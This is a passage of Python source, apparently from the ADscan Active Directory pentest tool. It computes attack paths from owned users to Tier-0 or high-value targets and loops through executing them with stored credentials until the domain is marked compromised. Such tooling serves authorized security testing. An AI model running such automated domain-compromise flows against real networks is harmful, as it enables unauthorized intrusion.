        True if an execution attempt was started, False otherwise.
    """
    start_norm = (start or "").strip().lower()
    require_high_value_target = not include_all
    _compute_summaries = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        include_all=include_all,
        target_mode=target_mode,
    )

    try:
        summaries = _compute_summaries()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False
    if not summaries:
        _print_no_attack_paths_warning(
            domain=domain,
            start=start,
            start_norm=start_norm,
            require_high_value_target=require_high_value_target,
            target_mode=target_mode,
        )
        return False

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=summaries,
        max_display=max_display,
        search_mode_label=_target_search_mode_label(
            include_all=include_all, target_mode=target_mode
        ),
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=_compute_summaries,
    )


def _target_scope_label(*, require_high_value_target: bool, target_mode: str) -> str:
    """Return a user-facing label for the current target filtering mode."""
    if not require_high_value_target:
        return "all targets"
    if str(target_mode or "impact").strip().lower() == "tier0":
        return "Tier-0 targets"
    return "high-value targets"


def _target_search_mode_label(*, include_all: bool, target_mode: str) -> str:
    """Return a compact label describing the current attack-path search mode."""
    if include_all:
        return "Pivot Search"
    if str(target_mode or "impact").strip().lower() == "tier0":
        return "Tier-0 Search"
    return "High-Value Search"


def _print_no_attack_paths_warning(
    *,
    domain: str,
    start: str,
    start_norm: str,
    require_high_value_target: bool,
    target_mode: str,
) -> None:
    """Emit a consistent warning when no attack paths are available."""
    marked_domain = mark_sensitive(domain, "domain")
    scope = _target_scope_label(
        require_high_value_target=require_high_value_target,
        target_mode=target_mode,
    )
    if start_norm == "owned":
        print_warning(
            f"No attack paths found from owned users to {scope} for {marked_domain}."
        )
        return
    marked_user = mark_sensitive(start, "user")
    print_warning(
        f"No attack paths found for {marked_user} to {scope} in {marked_domain}."
    )


def _build_attack_path_summary_provider(
    shell: Any,
    *,
    domain: str,
    start: str,
    max_depth: int,
    include_all: bool,
    target_mode: str,
) -> Callable[[], list[dict[str, Any]]]:
    """Build a reusable summary provider for a specific attack-path scope."""
    start_norm = (start or "").strip().lower()
    require_high_value_target = not include_all

    def _compute_summaries() -> list[dict[str, Any]]:
        if start_norm == "owned":
            owned_users = get_owned_domain_usernames_for_attack_paths(shell, domain)
            if not owned_users:
                return []
            return get_attack_path_summaries(
                shell,
                domain,
                scope="owned",
                max_depth=max_depth,
                max_paths=None,
                require_high_value_target=require_high_value_target,
                target_mode=target_mode,
            )

        marked_domain = mark_sensitive(domain, "domain")
        marked_user = mark_sensitive(start, "user")
        print_info(f"Searching attack paths for {marked_user} in {marked_domain}...")
        return get_attack_path_summaries(
            shell,
            domain,
            scope="user",
            username=start,
            max_depth=max_depth,
            max_paths=None,
            require_high_value_target=require_high_value_target,
            target_mode=target_mode,
        )

    return _compute_summaries


def offer_attack_paths_with_non_high_value_fallback(
    shell: Any,
    domain: str,
    *,
    start: str,
    max_depth: int = 10,
    max_display: int = 20,
    target_mode: str = "impact",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
) -> bool:
    """Offer high-value paths first, then optionally broaden to all targets.

    Behavior:
        - In `ctf` mode, when no Tier-0/high-value paths exist, automatically
          broadens to all reachable targets.
        - In `audit` mode, the operator is prompted before broadening.
    """
    start_norm = (start or "").strip().lower()
    primary_compute = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        include_all=False,
        target_mode=target_mode,
    )
    try:
        primary_summaries = primary_compute()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    if primary_summaries:
        return offer_attack_paths_for_execution_summaries(
            shell,
            domain,
            summaries=primary_summaries,
            max_display=max_display,
            search_mode_label=_target_search_mode_label(
                include_all=False, target_mode=target_mode
            ),
            context_username=context_username,
            context_password=context_password,
            allow_execute_all=allow_execute_all,
            default_execute_all=default_execute_all,
            execute_only_statuses=execute_only_statuses,
            retry_attempted=retry_attempted,
            recompute_summaries=primary_compute,
        )

    _print_no_attack_paths_warning(
        domain=domain,
        start=start,
        start_norm=start_norm,
        require_high_value_target=True,
        target_mode=target_mode,
    )

    fallback_default = str(getattr(shell, "type", "")).strip().lower() == "ctf"
    marked_domain = mark_sensitive(domain, "domain")
    subject = (
        "owned users" if start_norm == "owned" else mark_sensitive(start, "user")
    )

    message = Text()
    message.append(
        "No paths to Tier-0 or high-value targets were discovered from the current foothold.\n\n",
        style="bold yellow",
    )
    message.append("Scope: ", style="bold")
    message.append(f"{subject}\n")
    message.append("Domain: ", style="bold")
    message.append(f"{marked_domain}\n\n")
    message.append(
        "ADscan can broaden the search to non-high-value targets to identify "
        "pivot opportunities, intermediate control points, and lower-privilege "
        "expansion paths.",
        style="yellow",
    )

    title = (
        "Broadening Attack Path Search"
        if fallback_default
        else "Optional Pivot Path Enumeration"
    )
    print_panel(message, title=title, border_style="yellow", expand=False)

    broaden_search = fallback_default
    if not fallback_default:
        if is_non_interactive(shell=shell):
            print_info_debug(
                "[attack_paths] non-high-value fallback skipped: "
                f"domain={marked_domain} scope={mark_sensitive(start_norm or start, 'text')}"
            )
            broaden_search = False
        else:
            broaden_search = Confirm.ask(
                "Do you want to broaden the search to non-high-value targets now?",
                default=False,
            )
    else:
        print_info(
            "CTF mode active: broadening attack-path search to all reachable targets."
        )

    if not broaden_search:
        return False

    fallback_compute = _build_attack_path_summary_provider(
        shell,
        domain=domain,
        start=start,
        max_depth=max_depth,
        include_all=True,
        target_mode=target_mode,
    )
    try:
        fallback_summaries = fallback_compute()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    if not fallback_summaries:
        _print_no_attack_paths_warning(
            domain=domain,
            start=start,
            start_norm=start_norm,
            require_high_value_target=False,
            target_mode=target_mode,
        )
        return False

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=fallback_summaries,
        max_display=max_display,
        search_mode_label=_target_search_mode_label(
            include_all=True, target_mode=target_mode
        ),
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=fallback_compute,
    )


def offer_attack_paths_for_execution_for_principals(
    shell: Any,
    domain: str,
    *,
    principals: list[str],
    max_depth: int = 10,
    max_display: int = 20,
    include_all: bool = False,
    target_mode: str = "impact",
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
) -> bool:
    """Offer attack paths for a list of user principals and optionally execute one.

    This is used by batch credential discovery flows (e.g. password spraying)
    to avoid printing one identical group-originating path per user.
    """
    require_high_value_target = not include_all

    def _compute_summaries() -> list[dict[str, Any]]:
        return get_attack_path_summaries(
            shell,
            domain,
            scope="principals",
            principals=principals,
            max_depth=max_depth,
            max_paths=None,
            require_high_value_target=require_high_value_target,
            target_mode=target_mode,
        )

    try:
        summaries = _compute_summaries()
    except RecursionError as exc:
        telemetry.capture_exception(exc)
        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Attack-path computation failed while expanding nested group memberships "
            f"for {marked_domain}. The environment appears to have deep or cyclic "
            "group nesting."
        )
        return False

    return offer_attack_paths_for_execution_summaries(
        shell,
        domain,
        summaries=summaries,
        max_display=max_display,
        context_username=context_username,
        context_password=context_password,
        allow_execute_all=allow_execute_all,
        default_execute_all=default_execute_all,
        execute_only_statuses=execute_only_statuses,
        retry_attempted=retry_attempted,
        recompute_summaries=_compute_summaries,
    )


def offer_attack_paths_for_execution_summaries(
    shell: Any,
    domain: str,
    *,
    summaries: list[dict[str, Any]] | None,
    max_display: int = 20,
    search_mode_label: str | None = None,
    context_username: str | None = None,
    context_password: str | None = None,
    allow_execute_all: bool = False,
    default_execute_all: bool = False,
    execute_only_statuses: set[str] | None = None,
    retry_attempted: bool = False,
    recompute_summaries: Callable[[], list[dict[str, Any]]] | None = None,
) -> bool:
    """Shared UX loop for showing/executing already computed path summaries."""
    if not summaries:
        return False

    marked_domain = mark_sensitive(domain, "domain")

    # Track whether the domain was already compromised when we entered the UX.
    # If execution flips the domain into "pwned" during this session, we stop
    # offering additional paths to avoid noisy/redundant prompts.
    was_pwned_at_start = (
        getattr(shell, "domains_data", {}).get(domain, {}).get("auth") == "pwned"
        if isinstance(getattr(shell, "domains_data", None), dict)
        else False
    )

    non_interactive = is_non_interactive(shell=shell)

    print_info_debug(
        "[attack_paths] UX start: "
        f"domain={marked_domain} non_interactive={non_interactive!r} "
        f"was_pwned_at_start={was_pwned_at_start!r} "
        f"summaries={len(summaries) if isinstance(summaries, list) else 0}"
    )

    def _is_theoretical_status(value: object) -> bool:
        return str(value or "").strip().lower() == "theoretical"

    def _confirm_or_default(prompt: str, *, default: bool) -> bool:
        """Return `default` in non-interactive contexts to avoid blocking for input."""
        if non_interactive:
            print_info_debug(
                "[attack_paths] confirm defaulted (non-interactive): "
                f"domain={marked_domain} prompt={mark_sensitive(prompt, 'detail')} default={default!r}"
            )
            return default
        return Confirm.ask(prompt, default=default)

    def _refresh_summaries() -> list[dict[str, Any]]:
        if recompute_summaries is None:
            updated = _sorted_paths(list(summaries))
        else:
            updated = _sorted_paths(list(recompute_summaries() or []))
        return _annotate_execution_readiness(
            shell,
            domain=domain,
            summaries=updated,
            context_username=context_username,
            context_password=context_password,
        )

    def _domain_now_pwned() -> bool:
        domains_data = getattr(shell, "domains_data", None)
        if not isinstance(domains_data, dict):
            return False
        domain_data = domains_data.get(domain, {})
        if not isinstance(domain_data, dict):
            return False
        return domain_data.get("auth") == "pwned"

    desired_statuses = (
        {str(s).strip().lower() for s in execute_only_statuses}
        if execute_only_statuses
        else None
    )
    desired_statuses_set = (
        desired_statuses if isinstance(desired_statuses, set) else None
    )

    summaries = _refresh_summaries()
    print_info_debug(
        f"[attack_paths] summaries refreshed: domain={marked_domain} count={len(summaries)}"
    )
    actionable_paths = [
        summary
        for summary in summaries
        if _path_is_actionable_for_execution_prompt(
            summary, desired_statuses=desired_statuses_set
        )
    ]
    print_attack_paths_summary(
        domain,
        summaries,
        max_display=min(max_display, len(summaries)),
        search_mode_label=search_mode_label,
        actionable_count=len(actionable_paths),
    )
    if not actionable_paths:
        non_actionable_total, reasons = _summarize_non_actionable_paths(
            summaries,
            desired_statuses=desired_statuses_set,
        )
        reason_summary = _format_non_actionable_reason_summary(reasons)
        if reasons["needs_context"] > 0 and non_actionable_total == reasons["needs_context"]:
            print_warning(
                "No actionable attack paths are currently executable because the "
                "available paths have no usable execution credential context."
            )
        elif reasons["unsupported"] > 0 and non_actionable_total == reasons["unsupported"]:
            print_warning(
                "No actionable attack paths are currently executable because the "
                "available paths are not implemented for execution."
            )
        else:
            print_info(
                "No actionable attack paths are currently executable. "
                "You can still inspect the discovered paths."
            )
        print_info(f"Current path summary: {reason_summary}")
        print_info_debug(
            "[attack_paths] initial list has no actionable paths; keeping detail UX enabled: "
            f"domain={marked_domain} non_actionable={non_actionable_total} "
            f"exploited={reasons['exploited']} blocked={reasons['blocked']} "
            f"unsupported={reasons['unsupported']} unavailable={reasons['unavailable']} "
            f"needs_context={reasons['needs_context']} filtered={reasons['status_filtered']} "
            f"other={reasons['other']}"
        )

    executed = False

    # In non-interactive contexts, we run a single selection cycle and return.
    # The selection logic is the same as interactive: the default option is applied
    # by the selector implementation (or by our fallback).
    single_pass = non_interactive

    while True:
        options = [
            f"{idx + 1}. {summary.get('source')} -> {summary.get('target')} [{summary.get('status')}]"
            for idx, summary in enumerate(summaries[:max_display])
        ]
        if allow_execute_all:
            options.append("Execute all remaining attack paths (recommended for CI)")
        options.append("Skip attack path execution")

        execute_all_idx = len(options) - 2 if allow_execute_all else None
        skip_idx = len(options) - 1
        # Default selection rule:
        # - If batch execution is enabled and explicitly defaulted, prefer the batch option
        #   when there is at least one eligible candidate.
        # - Otherwise pick the first theoretical path; if none exist, default to Skip.
        default_idx = skip_idx
        if allow_execute_all and default_execute_all and execute_all_idx is not None:
            candidates_exist = any(
                (
                    (
                        str(summary.get("status") or "theoretical").strip().lower()
                        != "exploited"
                    )
                    and _status_allowed_by_filter(
                        str(summary.get("status") or "theoretical").strip().lower(),
                        desired_statuses_set,
                    )
                )
                for summary in summaries
            )
            if candidates_exist:
                default_idx = execute_all_idx
        if default_idx == skip_idx:
            default_idx = next(
                (
                    idx
                    for idx, summary in enumerate(summaries[:max_display])
                    if _is_theoretical_status(summary.get("status"))
                ),
                skip_idx,
            )

        selected_idx = None
        if hasattr(shell, "_questionary_select"):
            selected_idx = shell._questionary_select(
                "Select an attack path to view details:",
                options,
                default_idx=default_idx,
            )
        elif non_interactive:
            selected_idx = default_idx
        else:
            prompt_default = "0" if default_idx >= skip_idx else str(default_idx + 1)
            selection = Prompt.ask(
                "Select an attack path index (or 0 to skip)", default=prompt_default
            )
            try:
                selection_idx = int(selection)
            except ValueError:
                selection_idx = 0
            if selection_idx <= 0:
                selected_idx = len(options) - 1
            else:
                selected_idx = min(selection_idx - 1, len(options) - 1)

        if selected_idx is None:
            print_info_debug(
                f"[attack_paths] selection cancelled: domain={marked_domain}"
            )
            return executed

        if selected_idx >= skip_idx:
            print_info_debug(
                f"[attack_paths] user skipped execution: domain={marked_domain}"
            )
            return executed

        if (
            allow_execute_all
            and execute_all_idx is not None
            and selected_idx == execute_all_idx
        ):
            # Batch execution mode: attempt remaining theoretical paths (by default)
            candidates: list[dict[str, Any]] = []
            skipped_no_context = 0
            skipped_unsupported = 0
            for summary in summaries:
                status = str(summary.get("status") or "theoretical").strip().lower()
                if not _status_allowed_by_filter(status, desired_statuses_set):
                    continue
                if not retry_attempted and status == "attempted":
                    continue
                if status == "exploited":
                    continue
                if not _path_is_supported_for_execution(summary):
                    skipped_unsupported += 1
                    continue
                if not _path_has_ready_execution_context(summary):
                    skipped_no_context += 1
                    continue
                candidates.append(summary)

            if not candidates:
                if skipped_unsupported > 0:
                    print_warning(
                        "No remaining attack paths are supported for execution with "
                        "their current target types."
                    )
                    print_info_debug(
                        "[attack_paths] batch: "
                        f"domain={marked_domain} skipped_unsupported={skipped_unsupported}"
                    )
                if skipped_no_context > 0:
                    print_warning(
                        "No remaining attack paths are currently executable with the "
                        "stored credential context."
                    )
                    print_info_debug(
                        "[attack_paths] batch: "
                        f"domain={marked_domain} skipped_no_context={skipped_no_context}"
                    )
                print_info_verbose("No remaining attack paths eligible for execution.")
                print_info_debug(
                    f"[attack_paths] batch: domain={marked_domain} no eligible candidates"
                )
                return executed

            if skipped_unsupported > 0:
                print_info(
                    f"Skipping {skipped_unsupported} attack path(s) that are not "
                    "implemented for their current target types."
                )
                print_info_debug(
                    "[attack_paths] batch support pre-check: "
                    f"domain={marked_domain} eligible={len(candidates)} "
                    f"skipped_unsupported={skipped_unsupported}"
                )
            if skipped_no_context > 0:
                print_info(
                    f"Skipping {skipped_no_context} attack path(s) with no usable "
                    "execution credential context."
                )
                print_info_debug(
                    "[attack_paths] batch pre-check: "
                    f"domain={marked_domain} eligible={len(candidates)} "
                    f"skipped_no_context={skipped_no_context}"
                )

            if not _confirm_or_default(
                f"Execute {len(candidates)} attack path(s) now?",
                # If the user picked the batch option, default to yes; in CI/non-interactive
                # we should not block for input.
                default=True,
            ):
                continue

            for idx, summary in enumerate(candidates, start=1):
                try:
                    print_info_debug(
                        f"[batch] Executing attack path {idx}/{len(candidates)}: "
                        f"{summary.get('source')} -> {summary.get('target')} [{summary.get('status')}]"
                    )
                    attempted = execute_selected_attack_path(
                        shell,
                        domain,
                        summary=summary,
                        context_username=context_username,
                        context_password=context_password,
                        search_mode_label=search_mode_label,
                    )
                    executed = executed or attempted
                    if attempted and not was_pwned_at_start and _domain_now_pwned():
                        print_info_debug(
                            "[attack_paths] stopping after compromise: "
                            f"domain={marked_domain} auth transitioned to pwned"
                        )
                        return executed
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
                    # Keep going; execution is best-effort.
                    continue
            return executed

        selected = summaries[selected_idx]
        print_attack_path_detail(
            domain,
            selected,
            index=selected_idx + 1,
            search_mode_label=search_mode_label,
        )

        status = str(selected.get("status") or "theoretical").lower()
        selected_meta = selected.get("meta") if isinstance(selected.get("meta"), dict) else {}
        execution_context_required = bool(
            isinstance(selected_meta, dict)
            and selected_meta.get("execution_context_required")
        )
        execution_support_status = (
            str(selected_meta.get("execution_support_status") or "").strip().lower()
            if isinstance(selected_meta, dict)
            else ""
        )
        if execution_support_status == "unsupported":
            marked_action = mark_sensitive(
                str(selected_meta.get("execution_context_action") or "step"),
                "detail",
            )
            marked_reason = mark_sensitive(
                str(
                    selected_meta.get("execution_support_reason")
                    or "Unsupported target type"
                ),
                "detail",
            )
            print_warning(
                "This path is not currently implemented for execution with its "
                "current target type."
            )
            print_info_debug(
                "[attack_paths] execution pre-check blocked: "
                f"domain={marked_domain} action={marked_action} reason={marked_reason}"
            )
            if single_pass:
                return executed
            continue
        execution_ready_count = (
            selected_meta.get("execution_ready_count")
            if isinstance(selected_meta, dict)
            else None
        )
        if (
            execution_context_required
            and isinstance(execution_ready_count, int)
            and execution_ready_count <= 0
        ):
            marked_action = mark_sensitive(
                str(selected_meta.get("execution_context_action") or "step"),
                "detail",
            )
            marked_reason = mark_sensitive(
                str(
                    selected_meta.get("execution_readiness_reason")
                    or "no_usable_execution_context"
                ),
                "detail",
            )
            print_warning(
                "This path currently has no usable execution credential context. "
                "Acquire a stored credential for one of the affected users or pick another path."
            )
            print_info_debug(
                "[attack_paths] execution pre-check blocked: "
                f"domain={marked_domain} action={marked_action} reason={marked_reason}"
            )
            if single_pass:
                return executed
            continue

        if status == "exploited" and not _confirm_or_default(
            "This path is already exploited. Execute again?",
            default=False,
        ):
            print_info_debug(
                f"[attack_paths] execution skipped: domain={marked_domain} reason=already_exploited_no_reexec"
            )
            if single_pass:
                return executed
            continue
        if desired_statuses_set is not None and not _status_allowed_by_filter(
            status, desired_statuses_set
        ):
            print_info_verbose(
                f"Skipping execution for this path (status={status}) due to execution filter."
            )
            print_info_debug(
                "[attack_paths] execution skipped: "
                f"domain={marked_domain} reason=status_filtered status={mark_sensitive(status, 'detail')}"
            )
            if single_pass:
                return executed
            continue

        if not _confirm_or_default(
            "Execute this attack path now?",
            default=True,
        ):
            print_info_debug(
                f"[attack_paths] execution skipped: domain={marked_domain} reason=user_declined"
            )
            if single_pass:
                return executed
            continue

        executed = execute_selected_attack_path(
            shell,
            domain,
            summary=selected,
            context_username=context_username,
            context_password=context_password,
            search_mode_label=search_mode_label,
        )
        if executed:
            if not was_pwned_at_start and _domain_now_pwned():
                print_info_debug(
                    "[attack_paths] stopping after compromise: "
                    f"domain={marked_domain} auth transitioned to pwned"
                )
                return True
            if single_pass:
                return True
            affected_count = _affected_user_count(selected)
            if (
                recompute_summaries is not None
                and _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD > 0
                and affected_count >= _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD
            ):
                print_info(
                    "Execution completed. Skipping automatic attack-path refresh "
                    f"(affected principals={affected_count}, threshold={_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD}). "
                    "All attack steps are already persisted; only the live list refresh is deferred. "
                    "Run `attack_paths <domain> owned` when you want a fresh recomputation."
                )
                print_info_debug(
                    "[attack_paths] auto-refresh skipped after execution: "
                    f"domain={marked_domain} affected_users={affected_count} "
                    f"threshold={_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD}"
                )
                return True
            print_info_verbose(
                "Refreshing attack-path summaries after execution "
                "(this can take longer on large domains)."
            )
            summaries = _refresh_summaries()
            actionable_paths = [
                summary
                for summary in summaries
                if _path_is_actionable_for_execution_prompt(
                    summary, desired_statuses=desired_statuses_set
                )
            ]
            if actionable_paths:
                print_info_debug(
                    "[attack_paths] re-prompting after execution: "
                    f"domain={marked_domain} remaining={len(summaries)} actionable={len(actionable_paths)}"
                )
                print_attack_paths_summary(
                    domain,
                    summaries,
                    max_display=min(max_display, len(summaries)),
                    search_mode_label=search_mode_label,
                    actionable_count=len(actionable_paths),
                )
                continue
            if summaries:
                non_actionable_total, reasons = _summarize_non_actionable_paths(
                    summaries,
                    desired_statuses=desired_statuses_set,
                )
                reason_summary = _format_non_actionable_reason_summary(reasons)
                if reasons["exploited"] == non_actionable_total and non_actionable_total > 0:
                    print_info(
                        "Execution completed. No further actionable attack paths remain "
                        "because the remaining paths are already exploited."
                    )
                else:
                    print_info(
                        "Execution completed. No further actionable attack paths remain. "
                        "Any remaining paths are already exploited, blocked, unsupported, "
                        "or missing execution context."
                    )
                print_info(f"Remaining path summary: {reason_summary}")
                print_info_debug(
                    "[attack_paths] stopping after execution: "
                    f"domain={marked_domain} reason=no_actionable_paths "
                    f"remaining={non_actionable_total} exploited={reasons['exploited']} "
                    f"blocked={reasons['blocked']} unsupported={reasons['unsupported']} "
                    f"unavailable={reasons['unavailable']} needs_context={reasons['needs_context']} "
                    f"filtered={reasons['status_filtered']} other={reasons['other']}"
                )
                return True
            print_info_debug(
                f"[attack_paths] stopping after execution: domain={marked_domain} reason=no_remaining_paths"
            )
            return True

        # `execute_selected_attack_path` already printed a user-facing error/warning.
        # Keep the selection loop open so the user can try another path.
        print_info_debug(
            f"[attack_paths] re-prompting after failed attempt: domain={marked_domain}"
        )
        if single_pass:
            return executed
        continue

    return executed
